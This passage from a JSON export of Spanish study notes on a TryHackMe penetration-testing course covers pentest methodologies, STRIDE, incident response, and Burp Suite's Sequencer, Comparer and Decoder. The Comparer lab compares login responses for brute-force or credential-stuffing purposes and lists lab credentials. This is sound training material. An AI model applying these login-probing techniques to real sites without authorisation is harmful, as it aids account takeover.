    "content": "Antes de ense√±ar cosas t√©cnicas debemos entender cu√°les son las responsabilidades y procesos seguidos de un pentester en su realizaci√≥n de estos tests de penetraci√≥n.\n\nLa importancia y relevancia de la ciberseguridad est√°n creciendo a pasos agigantados. Las noticias sobre brechas e incidentes llenan las pantallas. La ciberseguridad es relevante para todas las personas en el mundo moderno.\n\nUn test de penetraci√≥n o pentest es un intento √©tico de comprobar y analizar la seguridad y resiliencia de un sistema o red y de sus m√©todos de defensa para proteger la informaci√≥n que alberga.\n\nUn pentest implica usar las mismas herramientas, t√©cnicas y metodolog√≠as que un agente malintencionado usar√≠a. \n\nDe acuerdo a varias fuentes, hay alrededor de 2200 ciberataques al d√≠a, uno cada 39 segundos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Penetration Testing Methodologies",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/3-penetration-testing-methodologies/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/3. Penetration Testing Methodologies.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": "Los pentests pueden tener una gran variedad de metas y objetivos en su alcance. Por esto, no has dos pentests iguales.\n\nLos pasos que sigue un pentester durante un test se conoce como metodolog√≠a. Una metodolog√≠a pr√°ctica es una donde los pasos tomados son relevantes a la situaci√≥n en mano. Por ejemplo una metodolog√≠a para un pentest web no es √∫til cuando se realiza un pentest red.\n\nAntes de entrar a ver metodolog√≠as concretas deber√≠amos tener en cuenta que todas tienen unos pasos en general:\n\n| **Fase**                   | **Descripci√≥n**                                                                                                                                                                                                                                                     |\n| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Recolecci√≥n de Informaci√≥n | Involucra recolectar la m√°xima cantidad de informaci√≥n p√∫blica accesible sobre un objetivo (con OSINT).<br><br>**Nota:** Esto no incluye el escaneo de sistemas.                                                                                                    |\n| Enumeraci√≥n/Escaneo        | Esta fase incluye descubrimiento de aplicaciones y servicios corriendo en los sistemas.                                                                                                                                                                             |\n| Explotaci√≥n                | Involucra usar vulnerabilidades descubiertas en un sistema o aplicaci√≥n. Puede necesitar el uso de exploits p√∫blicos o l√≥gica en la aplicaci√≥n.                                                                                                                     |\n| Escalada de Privilegios    | Una vez explotado un sistema o aplicaci√≥n, esta fase es el intento de expandir tus permisos y acceso al sistema. Puedes escalar vertical u horizontalmente, donde horizontal es a otra cuenta del mismo grupo de permisos y vertical a una con permisos superiores. |\n| Post-Explotaci√≥n           | Involucra algunas sub-fases:<br><br>**1.** Qu√© otros hosts pueden ser objetivos (pivotar).<br><br>**2.** Ahora que somos un usuario privilegiado, ¬øqu√© informaci√≥n puedo extraer del sistema?<br><br>**3.**¬† Limpiar tus huellas.<br><br>**4.** Reportar.           |\n\n-----------------------------------\n<h2>OSSTMM</h2>\nEl [Open Source Security Testing Methodology Manual](https://github.com/mtesauro/owasp-wte/blob/master/temp-projects/wte-docs/contents/usr/share/doc/WTE-Documentation/OSSTMM/OSSTMM.3.pdf) ofrece un framework detallado de estrategias de testeo de sistemas, software, aplicaciones, comunicaciones y el aspecto humano de la ciberseguridad.\n\nLa metodolog√≠a se enfoca en c√≥mo estos sistemas y aplicaciones se comunican e incluye metodolog√≠a para:\n\n1. Telecomunicaciones (tel√©fonos, VoIP, etc.).\n2. Redes cableadas.\n3. Comunicaciones inal√°mbricas.\n\n| **Ventajas**                                                                                                                                               | **Desventajas**                                              |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |\n| Cubre varias estrategias de testeo en profundidad.                                                                                                         | Es dif√≠cil de entender, detallado y usa definiciones √∫nicas. |\n| Incluye estrategias de testeo para objetivos espec√≠ficos (telecomunicaciones y redes).                                                                     | **E**n **B**lanco **A** **P**rop√≥sito                        |\n| The framework is flexible depending upon the organisation's needs.                                                                                         | EBAP                                                         |\n| The framework is meant to set a standard for systems and applications, meaning that a universal methodology can be used in a penetration testing scenario. | EBAP                                                         |\n\n--------------------------\n<h2>OWASP</h2>\nEl framework [Open Web Application Security Project](https://owasp.org/) es un framework dirigido por la comunidad y usualmente actualizado usado √∫nicamente para comprobar la seguridad de aplicaciones y servicios web.\n\nLa fundaci√≥n usualmente escribe reportes especificando las 10 vulnerabilidades m√°s t√≠picas que una aplicaci√≥n web puede tener, su acercamiento para comprobarlo y c√≥mo solucionarlo.\n\n\n| **Ventajas**                                                              | **Desventajas**                                                                  |\n| ------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |\n| F√°cil de entender                                                         | Puede no estar muy claro el tipo de vulnerabilidad que tiene una aplicaci√≥n web. |\n| Mantenido activa y frecuentemente.                                        | No hace sugerencias al desarrollo de ciclos de vida de ning√∫n software.          |\n| Cubre todas las etapas del engagement: desde el testing hasta el remedio. | No tiene ninguna acreditaci√≥n (como CHECK).                                      |\n| Se especializa en aplicaciones y servicios web.                           | EBAP                                                                             |\n\n-----------------------------\n<h2>NIST Cybersecurity Framework 1.1</h2>\nEl [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) es un framework popular usado para mejorar los est√°ndares de ciberseguridad de las empresas y manejar el riesgo de las ciberamenazas. Es una menci√≥n honor√≠fica debido a su popularidad y detalle.\n\nOfrece gu√≠as de controles de seguridad y benchmarks para el √©xito de las organizaciones, desde la infraestructura cr√≠tica hasta la comercial.\n\n\n| **Ventajas**                                                                                                  | **Desventajas**                                                                  |\n| ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |\n| Se estima que lo usan el 50% de las empresas americanas (2020).                                               | Puede ser dif√≠cil decidir cu√°l de los frameworks se adapta a tu empresa.         |\n| Extremadamente detallado en la configuraci√≥n de est√°ndares para ayudar a organizaciones a mitigar la amenaza. | Tiene pol√≠ticas de auditaje d√©biles, haciendo dif√≠cil saber qu√© caus√≥ la brecha. |\n| Actualizado muy frecuentemente.                                                                               | No considera la computaci√≥n en la nube.                                          |\n| Ofrece acreditaciones para las empresas que usan este framework.                                              | EBAP                                                                             |\n| Dise√±ado para ser implementado junto a otros frameworks.                                                      | EBAP                                                                             |\n\n----------------------\n<h2>NCSC CAF</h2>\nEl [Cyber Assessment Framework](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance) (CAF) es un framework extensivo de 14 principios usados para evaluar el riesgo de varias ciberamenazas y las defensas de una organizaci√≥n contra ellas.\n\nSe aplica a organizaciones consideradas de realizar \"servicios y actividades de vital importancia\", como infraestructura cr√≠tica, banking, y los semejantes. Se enfoca fundamentalmente en evaluar los siguientes temas.\n\n- Seguridad de la Informaci√≥n.\n- Seguridad de los Sistemas.\n- Control de Identidad y Acceso.\n- Resiliencia.\n- Monitorizaci√≥n.\n- Plan de Respuesta y Recuperaci√≥n.\n\n\n| Ventajas                                                     | Desventajas                                                                                                                                      |\n| ------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |\n| Respaldado por una agencia de ciberseguridad nacional.       | Todav√≠a es nuevo en la industria, lo que significa que muchas empresas no han tenido tiempo de hacer los cambios necesarios para cumplir con √©l. |\n| Ofrece acreditaci√≥n.                                         | Basado en principios e ideas, no es tan directo como otros frameworks con reglas.                                                                |\n| Cubre 14 principios que van desde seguridad hasta respuesta. | EBAP                                                                                                                                             |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Black box, White Box, Grey Box Penetration Testing",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/4-black-box-white-box-grey-box-penetration-testing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/4. Black box, White Box, Grey Box Penetration Testing.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": "Hay tres tipos primarios de alcance al testear una aplicaci√≥n o servicio. El nivel de entendimiento sobre tu objetivo determinar√° el tipo de testeo que realizar√°s.\n\n----------------------------\n<h2>Black-Box Testing</h2>\nEste es un proceso de alto nivel ya que al pentester no se le da ninguna informaci√≥n sobre los funcionamientos internos de la aplicaci√≥n o servicio.\n\n-----------------------------\n<h2>Grey-Box Testing</h2>\nEste proceso es el m√°s popular. Es una combinaci√≥n de blackbox y whitebox. Te dan informaci√≥n limitada sobre los componentes de la aplicaci√≥n o servicio.\n\n----------------------------\n<h2>White-Box Testing</h2>\nEste es un proceso de bajo nivel normalmente hecho por un desarrollador. En este conoces todo lo que se puede saber de los procesos y componentes internos del servicio o aplicaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Pentesting Fundamentals",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/1-pentesting-fundamentals/0-pentesting-fundamentals/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/1. Pentesting Fundamentals/0. Pentesting Fundamentals.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 1. Pentesting Fundamentals",
    "content": "[[1. What is Penetration Testing]]\n[[2. Penetration Testing Ethics]]\n[[3. Penetration Testing Methodologies]]\n[[4. Black box, White Box, Grey Box Penetration Testing]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Security Models Continued",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/3-security-models-continued/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/3. Security Models Continued.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "Antes de entrar en profundidad con los modelos de seguridad, recordemos los elementos de CIA: Confidencialidad, Integridad y Disponibilidad. De acuerdo con los modelos de seguridad, un sistema o tecnolog√≠a que almacena informaci√≥n se llama sistema de informaci√≥n.\n\n- Modelo Bell LaPadula (para confidencialidad).\n- Modelo Biba (para integridad).\n\nVisita la nota [[4. Fundamental Concepts of Security Models]] para obtener informaci√≥n de estos modelos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. The CIA Triad",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/1-the-cia-triad/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/1. The CIA Triad.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "La tr√≠ada CIA es un modelo de seguridad que es usado al crear una pol√≠tica de seguridad. Consiste de tres secciones: **C**onfidencialidad, **I**ntegridad, **A**vailability (Disponibilidad). Es un est√°ndar de la industria hoy en d√≠a.\n\nPara m√°s informaci√≥n sobre la tr√≠ada visita la nota [[2. CIA]].",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Threat Modelling & Incident Response",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/4-threat-modelling-incident-response/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/4. Threat Modelling & Incident Response.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "Threat Modelling es el proceso de revisar, mejorar y testear los protocolos de seguridad de la infraestructura de tecnolog√≠as de informaci√≥n de una organizaci√≥n.\n\nUna fase cr√≠tica es identificar posibles peligros que pueden enfrentar una aplicaci√≥n o sistema y sus vulnerabilidades.\n\nEl proceso es muy similar al manejo de riesgos hecho por los empleados y clientes en un sitio de trabajo. Los principios son:\n\n- Preparaci√≥n.\n- Identificaci√≥n.\n- Mitigaci√≥n.\n- Revisi√≥n.\n\n![[Pasted image 20251102145041.png]]\n\nEs, sin embargo un proceso complejo que necesita revisi√≥n constante y verlo con un equipo dedicado a ello. Un modelo de amenaza efectivo incluye:\n\n- Inteligencia de amenaza (threat intelligence).\n- Identificaci√≥n de activos (asset identification).\n- Capacidades de mitigaci√≥n (mitigation capabilities).\n- Evaluaci√≥n de riesgos (risk assessment).\n\nPara ayudarnos en esta tarea tenemos frameworks como **STRIDE** (**S**poofing identity (suplantar identidad), **T**ampering with data (manipular informaci√≥n), **R**epudiation threats (amenazas de repudio), **I**nformation disclosure (divulgaci√≥n de informaci√≥n), **D**enial of service (denegaci√≥n de servicio) y **E**levation of privileges (elevaci√≥n de privilegios)) y **PASTA** (**P**rocess for **A**ttack **S**imulation and **T**hreat **A**nalysis (Proceso para la simulaci√≥n de ataques y an√°lisis de amenazas)).\n\nSTRIDE incluye seis principios:\n\n\n| **Principio**          | **Descripci√≥n**                                                                                                                                                                                                                                                         |\n| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Spoofing               | Este principio requiere autentificar las peticiones y los usuarios que acceden al sistema. El spoofing (suplantaci√≥n) involucra a una parte que se hace pasar por otro.<br><br>Access keys (such as API keys) or signatures via encryption helps remediate this threat. |\n| Tampering              | Ofreciendo medidas anti tampering (manipulaci√≥n) a un sistema o aplicaci√≥n ayudas a ofrecer y mantener la integridad.                                                                                                                                                   |\n| Repudiation            | Dicta el uso de servicios como el registro de actividad para que un sistema o aplicaci√≥n realice un seguimiento.                                                                                                                                                        |\n| Information Disclosure | Las aplicaciones o servicios que tratan con informaci√≥n de m√∫ltiples usuarios necesitan ser configuradas de manera apropiada para mostrar s√≥lo la informaci√≥n relevante al due√±o.                                                                                       |\n| Denial of Service      | Las aplicaciones y servicios usan recursos. Estos deben tener medidas para que en caso de abuso del servicio no se caiga todo el sistema.                                                                                                                               |\n| Elevation of Privilege | Este es el peor caso. Significa que un usuario ya consigui√≥ entrar y escalar sus privilegios para hacer lo que quiera. Suele terminar en divulgaci√≥n de informaci√≥n confidencial u otras formas de post explotaci√≥n.                                                    |\n\nUna brecha de seguridad se conoce como un incidente. Las acciones tomadas para resolver una amenaza se conocen como IR (Incident Response).\n\nEstos incidentes se clasifican usando una calificaci√≥n de urgencia e impacto. La urgencia se determina por el tipo de ataque sufrido y el impacto por las posibles consecuencias que puede tener el incidente.\n\n![[Pasted image 20251102154056.png]]\n\nA un incidente responde un **C**omputer **S**ecurity **I**ncident **R**espose **T**eam (**CSIRT**; Equipo de Respuesta a Incidentes de Seguridad de Ordenadores), que es un grupo formado por empleados con conocimiento t√©cnicos sobre los sistemas. Para resolver un incidente normalmente nos remitimos a estos seis pasos o fases:\n\n\n| Acci√≥n               | Explicaci√≥n                                                                                                                        |\n| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |\n| Preparaci√≥n          | Incluye construir los recursos necesarios para manejar el incidente.                                                               |\n| Identificaci√≥n       | B√∫squeda de cualquier comportamiento inusual que indique un incidente.                                                             |\n| Contenci√≥n           | Suele ser hecho aislando la m√°quina v√≠ctima, desactivando sus cuentas, etc.                                                        |\n| Erradicaci√≥n         | Incluye eliminar la amenaza del entorno atacado. Asegura la limpieza del entorno.                                                  |\n| Recuperaci√≥n         | Incluye recuperar los sistemas afectados desde un backup o reconstruirlos.                                                         |\n| Lecciones Aprendidas | Una parte muy importante es reflexionar sobre por qu√© ha ocurrido lo ocurrido. Nos permite mejorar nuestros sistemas de seguridad. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Principles of Privileges",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/2-principles-of-privileges/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/2. Principles of Privileges.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "Es vital administrar y definir correctamente los diferentes niveles de acceso a la informaci√≥n y sistemas.\n\nLos niveles de acceso que se dan a los usuarios se determinan de dos maneras:\n\n- El rol/funci√≥n del individuo dentro de la organizaci√≥n.\n- La sensibilidad de la informaci√≥n guardada en el sistema.\n\nHay dos conceptos clave para asignar y dirigir los derechos de acceso de cada individuo: **P**rivileged **I**dentity **M**anagement (**PIM**; Manejo de Identidad Privilegiada) y **P**rivileged **A**ccess **M**anagement (**PAM**; manejo de Acceso Privilegiado).\n\nParecen el mismo concepto pero hay diferencias. PIM se usa para traducir el rol de un usuario en la organizaci√≥n a privilegios en un sistema, mientras que PAM se usa para gestionar los privilegios en un rol de acceso entre otras cosas. PAM tambi√©n involucra reforzar las pol√≠ticas de seguridad.\n\nLo que es esencial es el concepto de \"least privilege\". Simplemente, a los usuarios se les deber√≠an dar los menos privilegios posibles para llevar a cabo sus tareas/funciones.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Principles of Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/2-introduction-to-pentesting/2-principles-of-security/0-principles-of-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/2. Introduction to Pentesting/2. Principles of Security/0. Principles of Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 2. Introduction to Pentesting > 2. Principles of Security",
    "content": "[[1. The CIA Triad]]\n[[2. Principles of Privileges]]\n[[3. Security Models Continued]]\n[[4. Threat Modelling & Incident Response]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Organizer - Overview",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/9-organizer-overview/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/9. Organizer - Overview.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "El m√≥dulo Organizer en Burp Suite est√° dise√±ado para ayudarnos a guardar y anotar copias de las peticiones HTTP que podamos querer revisar despu√©s. Puede ser especialmente √∫til para organizar tu flujo de trabajo de penetration test.\n\n- Puedes guardar peticiones que quieras investigar m√°s tarde, que hayas identificado como interesantes o que quieras a√±adir al reporte m√°s tarde.\n- Puedes mandar peticiones HTTP al Organizer desde otros m√≥dulos con `Ctrl + O` o haciendo click derecho en \"Send to Organizer\". Cada una que mandes ser√° una copia de s√≥lo lectura de la petici√≥n original.\n- Se guardan en tablas, que contienen columnas como la de n√∫mero de petici√≥n, la hora a la que fue ejecutada, herramienta de Burp Suite desde la que se mand√≥, etc.\n  ![[Pasted image 20251116234337.png]]\n\nPara ver la petici√≥n y la respuesta:\n\n1. Haz click en cualquier √≠tem del Organizador.\n2. La petici√≥n y la respuesta ser√°n de s√≥lo lectura (read-only). Puedes buscar dentro de la petici√≥n o la respuesta. Selecciona la petici√≥n y luego usar la barra de b√∫squeda debajo de la petici√≥n.\n\n![[Pasted image 20251116234534.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Sequencer - Analysis",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/8-sequencer-analysis/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/8. Sequencer - Analysis.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Ahora que tenemos un reporte generado para el an√°lisis de entrop√≠a del token toca analizarlo.\n\nEl reporte del an√°lisis de entrop√≠a se divide en 4 partes.\n\n![[Pasted image 20251116225740.png]]\n\n- **Overall result:** Muestra una evaluaci√≥n amplia de la seguridad del mecanismo de generaci√≥n del token.\n- **Effective entropy:** Mide la aleatoriedad de los tokens. Cuanto m√°s alta mejor.\n- **Reliability:** El nivel de significancia de 1% implica que hay un 99% de certeza en la precisi√≥n de los resultados.\n- **Sample:** Ofrece detalles sobre los ejemplos de tokens analizados durante el proceso de an√°lisis de entrop√≠a, incluyendo el n√∫mero de tokens y sus caracter√≠sticas.\n\nMientras que el resumen del reporte normalmente ofrece suficiente informaci√≥n, es importante recordar que puede ser necesaria una investigaci√≥n m√°s profunda en algunos casos. El an√°lisis a nivel de car√°cter y de bit puede ofrecer una vista m√°s detallada de la randomizaci√≥n de tokens.\n\nMientra que el reporte de entrop√≠a puede ofrecer un indicador de seguridad alto para el mecanismo de generaci√≥n del token, debe haber pruebas m√°s definitivas. Dicho esto, una entrop√≠a efectiva de 109 bits y nivel de significancia de 1% sugiere un proceso de generaci√≥n de tokens robusto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Sequencer - Overview",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/6-sequencer-overview/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/6. Sequencer - Overview.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "El Sequencer nos permite evaluar la entrop√≠a, o aleatoriedad, de los tokens. Los tokens son strings usadas para identificar algo y deber√≠an generadas de una manera criptogr√°ficamente segura. Estos tokens podr√≠an ser cookies de sesi√≥n o tokens CSRF (Cross-Site Request Forgery), usados para proteger formularios de subida. Si no se generan de manera segura, podr√≠amos imaginarnos valores futuros.\n\nVeamos la interfaz del Sequencer.\n\n![[Pasted image 20251116220129.png]]\n\nTenemos dos formas principales de realizar an√°lisis de tokens con el Sequencer:\n\n- **Live Capture:** Este es el m√©todo m√°s com√∫n y el que viene por defecto. Captura una petici√≥n pasante que generar√° un token para el an√°lisis del Sequencer. El Sequencer realizar√° miles de peticiones para obtener valores y despu√©s las analizar√°.\n- **Manual Load:** Esto nos permite cargar una lista de tokens pregenerados. De esta manera evitamos mandar miles de peticiones lo que puede ser ruidoso y consumir muchos recursos, pero necesitamos tener una larga lista.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Sequencer - Live Capture",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/7-sequencer-live-capture/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/7. Sequencer - Live Capture.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Adentr√©monos en el proceso de usar el modo **Live Capture** del Sequencer para analizar la entrop√≠a del token anti fuerza bruta empleado en el formulario de login.\n\n1. Vamos al sitio y capturamos una petici√≥n.\n   ![[Pasted image 20251116224443.png]]\n2. En la parte de **Token location within response** podemos seleccionar **Cookie**, **Form field** y **Custom location**. Como estamos comprobando el loginToken, se damos a \"Form field\" y seleccionamos el loginToken del desplegable.\n   ![[Pasted image 20251116224504.png]]\n3. Le damos a **Start Live Capture**. Analizamos alrededor de las 10000 peticiones.\n   ![[Pasted image 20251116224837.png]]\n4. Si le damos a **Auto analyze** se hace s√≥lo y peri√≥dicamente. Cuando termina el an√°lisis podemos ver los resultados.\n   ![[Pasted image 20251116225202.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Comparer - Example",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/5-comparer-example/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/5. Comparer - Example.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Ya sabemos lo que hace el Comparer, pero ¬øc√≥mo lo vamos a utilizar?\n\nHay varias situaciones en la que es de ayuda comparar r√°pidamente entre dos archivos potencialmente largos.\n\nPor ejemplo al realizar un ataque de login de fuerza bruta, o credential stuffing, puedes querer comparar dos respuestas con diferentes longitudes para ver d√≥nde la diferencia est√°.\n\n----------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251116214501.png]]\n2. Capturamos una petici√≥n de loguin y la mandamos al repetidor.\n   ![[Pasted image 20251116214615.png]]\n3. Mandamos la petici√≥n y redireccionamos la respuesta al Comparer.\n   ![[Pasted image 20251116214754.png]]\n4. El el repetidor introducimos las siguientes credenciales: `support_admin` y `w58ySK4W` y mandamos la respuesta al Comparer.\n   ![[Pasted image 20251116214952.png]]\n5. Comparamos para identificar diferencias.\n   ![[Pasted image 20251116215100.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Decoder - Overview",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/1-decoder-overview/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/1. Decoder - Overview.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "El m√≥dulo Decoder de Burp Suite le da al usuario capacidad de manipulaci√≥n de datos. Como implica su nombre, no s√≥lo decodea datos interceptados durante un ataque sino que tambi√©n ofrece la funci√≥n de encodear nuestra propia informaci√≥n, prepar√°ndola para la transmisi√≥n al objetivo. Tambi√©n nos permite crear hashsums de datos, como ofrecer una funcionalidad de Decodeo Inteligente que intenta decodear la informaci√≥n recursivamente hasta que vuelve a ser texto plano (como la funci√≥n Magic de Cyberchef).\n\nPara acceder al Decoder, navega a la pesta√±a Decoder en el men√∫ de arriba y mira las opciones disponibles:\n\n![[Pasted image 20251116182217.png]]\n\nEsta interfaz muestra bastantes opciones.\n\n1. Esta caja sirve como espacio de trabajo para introducir o pegar informaci√≥n que requiere encoding o decoding. La informaci√≥n puede ser movida entre m√≥dulos con \"**Send to Decoder**\" si haces click derecho en ella.\n2. Arriba de la lista de la derecha, hay una opci√≥n para tratar el input como texto o valor hexadecimal.\n3. Al movernos hacia abajo en la lista, los men√∫s desplegables se presentan para encodear, decodear, o hashear el input.\n4. La funcionalidad de **Smart Decode**, localizada al final, intenta auto-decodear el input.\n   ![[Pasted image 20251116182626.png]]\nAl introducir informaci√≥n en el campo input, la interfaz se replica para presentar el output de nuestra operaci√≥n. Podemos elegir entonces aplicar m√°s transformaciones usando las mismas opciones.\n\n![[Pasted image 20251116182727.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Decoder - Hashing",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/3-decoder-hashing/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/3. Decoder - Hashing.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Adem√°s de su funcionalidad de Encodear/Decodear, el Decoder tambi√©n ofrece la habilidad de generar hashsums para la informaci√≥n.\n\n--------------------------------\n<h2>Teor√≠a</h2>\nHashing es un proceso de una direcci√≥n que transforma la informaci√≥n en una firma √∫nica. Para que una funci√≥n se clasifique como un algoritmo de hashing, el output que genera debe ser irreversible. Un algoritmo bueno asegura que cada input de informaci√≥n tenga un √∫nico hash. Es por esto que generalmente se utilizan para confirmar la integridad de un archivo.\n\n>[!CAUTION] El algoritmo MD5 est√° deprecado y no debe usarse para aplicaciones contempor√°neas.\n\nAdem√°s los hashes se usan para almacenar contrase√±as de forma segura ya que como es un proceso unidireccional no puede ser descifrado y por lo tanto las hace \"seguras\" aunque se filtre la base de datos. Lo que pasa para que esto ocurra es:\n\n1. Intentas entrar con una contrase√±a. \n2. Se hashea y se comprueba ese hash con el guardado.\n3. Si es igual te permite entrar y si no, no.\n\n--------------------------------\n<h2>Hashear en el Decoder</h2>\nEl Decoder nos permite crear hashsums de informaci√≥n directamente en Burp Suite. Opera de manera similar al encoder/decoder. Hacemos click en el men√∫ desplegable `Hash` y seleccionamos el que queramos.\n\n![[Pasted image 20251116210530.png]]\n\nEs una lista bastante larga.\n\nEl output de un algoritmo de hasheo no es ASCII/Unicode por lo que compete encodearlo aplicando ASCII Hex:\n\n![[Pasted image 20251116210858.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Other Modules",
